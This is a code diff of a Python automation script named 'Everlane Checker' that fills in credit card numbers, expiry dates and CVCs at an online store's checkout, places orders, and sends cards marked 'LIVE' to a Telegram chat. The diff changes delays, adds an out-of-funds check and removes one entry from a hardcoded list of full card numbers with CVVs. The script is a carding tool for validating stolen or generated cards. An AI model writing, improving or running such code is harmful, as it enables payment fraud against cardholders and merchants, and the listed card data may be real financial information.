@@ -96,27 +96,27 @@ def livear(cc_namso):
     cc = separar_cc(cc_namso)
 
     if bot.locate('cc'):
-        bot.pause(0.2)
+        bot.pause(0.3)
         print(f'CC: {cc[0]}')
         bot.write(cc[0])
-        bot.pause(0.2)
+        bot.pause(0.3)
         bot.write(cc[1])
 
-        bot.pause(0.2)
+        bot.pause(0.3)
         print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
         bot.write(cc[2][2:4])
 
-        bot.pause(0.2)
+        bot.pause(0.3)
         print(f"CVC: {cc[3]}")
         bot.write(cc[3])
 
-        bot.pause(0.2)
+        bot.pause(0.3)
         bot.locate('credit_card')
         bot.scroll(-500)
         bot.pause(1.5)
         bot.locate('review_order', check=True)
 
-        bot.pause(1)
+        bot.pause(0.5)
         bot.locate('place_order')
 
     elif bot.locate('payment_method', click=False) or bot.locate('credit_card', click=False):
@@ -188,7 +188,7 @@ def livear(cc_namso):
     if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
         print(f'CC: {cc} - Live!')
 
-        content = f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE!\n\n✅CC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}"
+        content = f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}"
 
         telegram(content, '-726102881')
         bot.press_both('ctrl', 'l')
@@ -202,6 +202,8 @@ def livear(cc_namso):
 
     elif bot.locate('error1', click=False):
         print('There was a problem processing your card. Please call your card issuer or try a different card.')
+    elif bot.locate('out_funds', click=False):
+        print('Your card appears to be out of funds. Please try a new one.')
 
     
 # Logica
@@ -209,7 +211,6 @@ def livear(cc_namso):
 def main():
 
     ccs = """
-5217295329252583|11|2023|824
 5217295329245041|11|2023|330
 5217295329212850|11|2023|642
 5217295329201127|11|2023|772
